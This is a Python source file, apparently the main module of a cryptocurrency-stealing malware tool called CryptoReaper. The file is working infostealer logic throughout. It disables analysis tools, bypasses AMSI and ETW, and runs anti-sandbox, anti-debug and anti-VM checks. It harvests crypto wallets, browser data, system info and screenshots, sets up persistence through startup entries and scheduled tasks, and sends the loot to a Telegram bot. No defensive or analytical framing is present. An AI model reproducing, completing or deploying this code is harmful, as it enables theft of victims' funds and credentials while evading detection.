import os
import sys
import json
import base64
import asyncio
from cryptography.fernet import Fernet

from . import wallets
from . import browsers
from . import evasion
from . import comms

class CryptoReaper:
    def __init__(self):
        self.config = self.load_config()
        self.collected_data = {
            "wallets": {},
            "browsers": {},
            "system_info": {},
            "screenshots": []
        }
    
    def load_config(self):
        with open("key.bin", "rb") as f:
            key = f.read()
        
        with open("config_encrypted.bin", "rb") as f:
            encrypted_config = f.read()
        
        cipher = Fernet(key)
        config = json.loads(cipher.decrypt(encrypted_config).decode())
        return config
    
    async def execute_evasion(self):
        if self.config["evasion"]:
            evasion.kill_analysis_tools()
            evasion.bypass_amsi_etw()
            
            if evasion.detect_sandbox():
                sys.exit()
            
            if self.config["anti_analysis"]:
                evasion.anti_debug()
                evasion.anti_vm()
    
    async def steal_crypto_data(self):
        self.collected_data["wallets"] = await wallets.scan_all_wallets()
        self.collected_data["browsers"] = await browsers.extract_all_browser_data()
        self.collected_data["system_info"] = evasion.get_system_info()
        if self.collected_data["wallets"]:
            self.collected_data["screenshots"] = evasion.take_screenshots()
    
    async def establish_persistence(self):
        if self.config["persistence"]:
            evasion.add_to_startup()
            evasion.create_scheduled_task()
    
    async def exfiltrate_data(self):
        if self.config["telegram"]:
            bot_token, chat_id = self.config["telegram"].split(":")
            await comms.send_to_telegram(self.collected_data, bot_token, chat_id)
    
    async def run(self):
        await self.execute_evasion()
        await self.steal_crypto_data()
        
        if self.collected_data["wallets"]:
            await self.establish_persistence()
            await self.exfiltrate_data()

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "fileless":
        import tempfile
        import runpy
        temp_dir = tempfile.mkdtemp()
        os.chdir(temp_dir)
    
    reaper = CryptoReaper()
    asyncio.run(reaper.run())

if __name__ == "__main__":
    main()